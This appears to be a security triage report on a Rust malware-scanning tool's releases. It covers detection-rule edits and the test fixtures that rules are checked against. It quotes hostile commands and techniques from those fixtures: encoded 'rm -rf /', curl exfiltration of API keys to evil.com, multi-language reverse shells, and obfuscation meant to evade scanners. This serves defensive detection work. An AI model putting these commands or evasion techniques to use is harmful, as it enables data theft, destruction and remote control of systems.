judgment_evidence: Each distribution is Rust source for a defensive security auditor. Cargo manifests and the complete release diffs were examined independently of detector findings. Original sample hashes match the supplied SHA-256 values.

All four flagged executable example files are byte-identical across this batch and to each fetched preceding release. examples/bypass-attempts/README.md explicitly identifies them as malicious patterns used to test and improve detection. examples/README.md invokes cargo run -- check on their directory, which scans rather than executes the samples.

main.rs dispatches user-selected subcommands. ScannerConfig::read_file uses fs::read_to_string; check_content delegates to RuleEngine, whose check_line tests regex patterns/exclusions and constructs findings. The deobfuscator returns decoded strings to that same checker, without evaluating them. No reviewed build/install or program entrypoint invokes these bundled examples.

The auditor has purpose-consistent user-requested git cloning, an MCP inspection proxy, and optional GitHub feedback submission. The release diffs add no covert exfiltration, persistence, staging, cleanup, or privilege-escalation path.

Packaging, explicit testing documentation, unchanged corpus contents and purpose-consistent production changes tip all three verdicts to BENIGN. Installation history, operator authorization and whether a user separately executed an example were not supplied. No such deployment scenario is assumed.

execution_review.hex-octal.sh: The first echo hex escapes decode to sudo rm -rf / and are substituted into bash -c. This is a real destructive request; rm preserve-root and sudo authentication can prevent success. The printf hex escapes form curl, followed by a URL and -d $SECRET. ANSI-C escapes form sudo for rm -rf /tmp/target. The octal external echo -e argument spells curl https://evil.com -d $API_KEY, but its non-zero-prefixed octal escapes are nonportable and are not decoded by Bash echo as written. MNUGK4TF decodes to chere, not curl as the comment claims; its Base32 output is still piped to Bash. No fixture was run.
execution_review.polyglot.sh: Executable outbound reverse shells: Python connects a TCP socket, duplicates its descriptor onto standard input/output/error, and calls an interactive shell. Perl redirects handles before exec; Ruby, PHP and Lua use shell descriptor redirections. Bash redirects its interactive shell over /dev/tcp and also has an fd-5 remote command loop. Awk receives commands and runs them through a bidirectional coprocess. The telnet variant cycles shell I/O through one FIFO, and socat launches an interactive PTY shell. Earlier blocking commands and the loop can prevent later variants from running. These are real capabilities; no successful connection is claimed.
execution_review.node-evasion.js: Dynamic require resolves child_process. Top-level cp.exec sends API_KEY with curl; joined fragments produce curl for eval, an invoked Function receives require, and vm.runInThisContext is supplied command source. A Base64 buffer decodes curl https://evil.com -d $API_KEY for exec. Other examples alter Object.prototype.exec, dynamically import child_process, launch an eval worker with secret-bearing curl, fetch POST JSON containing process.env.API_KEY, and send process.env.SECRET on WebSocket open. VM/require availability and thrown errors can prevent later statements. Existing structured execution, decoder, worker, environment/body, HTTP and WebSocket traits cover these primitives; no hostility is inferred from a generic API alone.
execution_review.python-evasion.py: Dynamic import returns requests and POSTs API_KEY; getattr retrieves urllib urlopen for a secret-bearing URL. chr/join reconstructs import os for exec. A compiled code object is executed; Base64 decodes os.system("curl https://evil.com") for eval. Lambda import/system and a shell=True subprocess provide further command execution. The globals __builtins__ expression may fail depending on whether builtins is a dict. The embedded protocol-0 pickle invokes os.system when unpickled; it is not marshal data. ctypes.CDLL(None) loads the current process, while its system call is commented out. Existing primitive findings remain; no runtime success is assumed.
execution_review.exfiltration.rs: Rust rules construct Regex objects and compare input. Shell/Python snippets are constants in test vectors, not executed commands. v3.8.0 adds markdown/HTML exfiltration pattern tests; v3.11.5 adds analogous strings to runtime deny tests.

rule_changes.reason: loads(b...) also matches pickle.loads and json.loads. Preserve exact syntax matcher and notable severity in source call syntax; the consuming marshal composite retains its module-import evidence.

printf interprets hex character escapes into bytes; it does not encode arbitrary input to hexadecimal text. Preserve four-escape minimum, matcher, scope, exclusions and both shell consumers under char-code decoding.
exec curl command text requires no output-file operation. Retain matcher/severity, clarify embedded command text evidence, and move from download to curl client context.

printf command-name construction establishes neither HTTP contact nor a saved artifact. Preserve both atomic matchers and composite, plus the hidden-payload consumer and response-acquisition selector membership.

Missed supported decoded destructive request. Match recursive/force rm of exact root in decoded data, including Unicode escapes and Base64. A delimiter after / rejects /tmp and /home cleanup. Suspicious describes a deletion request; it does not assert a successful filesystem wipe.

consumer_review: Exact old IDs and all ancestor/destination directory selectors inspected before moves. Old data/encode/hex directory selector is used in a JavaScript-only trailing-whitespace composite; old data/encode selector in a PHP-only RAT composite. Neither can consume the shell-only printf atom. Exact shell consumers were updated and the new leaf is existing/admitted.

Old dropper directory is selected by Windows PE hosts-sinkhole detection and CrystalX native-binary exclusions; their type gates exclude the Python-only loads syntax. The same-directory marshal consumer now references the relocated syntax atom. No new objective admits plain pickle/JSON data as marshal.

The old curl-download selector in the Mach-O fingerprint composite cannot consume shell/JavaScript-only moved rules. Response-acquisition retains its original member population via exact moved IDs. Destination curl selectors remain general curl context; their independent exploit/secret/path requirements and source scopes were inspected. Paired sample and external scans show no additional inherited convictions or suppressions.

coverage.samples: Compare every notable-or-higher finding in all 535, 567 and 580 analyzed units with renamed IDs normalized. Only the encoded-root-delete trait is added, to each archive and its hex-octal.sh member. Zero unmatched removals, severity reductions or material attack coverage losses.
coverage.external_controls: 76 pre-existing/focused inputs produced 107 paired analyzed units. Normalizing the six moved IDs, all previous notable/suspicious/hostile findings and criticalities are identical. Existing shell obfuscation, reverse shells, staged marshal artifacts and benign pickle/transport controls included.
coverage.consumer_positive: A separate static netcat-loop control using an ordinary public non-DNS address retains raw-ip-netcat-binary-protocol-loop at hostile under original and edited traits. The earlier 8.8.8.8 variant did not satisfy the pre-existing external_ip predicate; no attack detector was weakened to accommodate that control.
coverage.focused: check.py copies 15 fixtures outside testing directories and only statically scans them. All checks pass: bytes-load syntax, marshal consumer, hex decode versus encode, retained netcat consumer, both curl observations, encoded root positive, encoded /tmp and /home near misses, ordinary encoded git status, and unencoded documentation string.
coverage.prior_clean_claim: Fetched v3.2.8, v3.7.0 and v3.11.4 all reproduce zero hostile/five suspicious findings before edits; the queue clean-release premise is not reproducible with these rules. v3.7.9 does not exist (forager returned 404); CHANGELOG identifies v3.7.0 as the predecessor to v3.8.0.
coverage.classifier: All final archive probabilities are 0.99, calibrated level 279, confidence 80; before, probabilities were 0.95640534/0.95562047/0.95562047 with calibrated level -1. Accurate detection of an encoded root-deletion fixture exposes a package-context classifier false positive. Preserve the real behavior instead of suppressing it to force BENIGN. No YAML hostile trait is emitted for these archives.
coverage.limitations: Source-level static review; no attack code or endpoint was executed/contacted intentionally. Cleave reports incomplete embedded-source/flow extraction for some workflow/fixture units; full original-to-prior content diffs and manual path tracing provide independent evidence. No malicious deployment or successful attack is inferred.

scan_method: atomscan --no-update --analyze local --mode slow --follow=none -f json for all original and preceding archives; cleave facts for each archive and all five listed/relevant members. Initial exploratory --follow none runs also treated none as a missing path and followed references; those outputs are excluded from the controlled baseline/final comparison.
validation: make validate is the final action; its result is reported to the user.
